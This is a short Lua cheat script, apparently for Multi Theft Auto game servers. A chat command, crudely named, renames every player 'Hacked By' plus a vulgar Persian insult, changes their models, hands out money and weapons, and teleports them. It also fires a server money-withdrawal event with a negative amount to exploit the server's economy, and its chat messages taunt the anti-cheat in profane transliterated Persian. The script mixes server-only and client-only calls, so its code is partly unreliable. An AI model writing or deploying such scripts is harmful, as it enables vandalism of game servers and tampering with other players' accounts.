function CheatModeCommand()
    for _, player in ipairs(getElementsByType("player")) do
        setPlayerName(player, "Hacked By Kos Kir Kon")
        setElementModel(player, 178)
        outputChatBox("Kiram To Anti Cheateton Ta Shoma Bashin Anti Cheat Maro Nakharin Konia!!!!", player, 255, 0, 0, true)
        givePlayerMoney(player, 99999999)
        setElementPosition(player, 100, 200, 10)
        giveWeapon(player, 31, 1000)
        triggerServerEvent("withdrawMoneyPersonal", player, -1000000)
    end
    outputChatBox("همه مورد تغییر قرار گرفتند!", 255, 0, 0, true)
end
addCommandHandler("sex", CheatModeCommand)
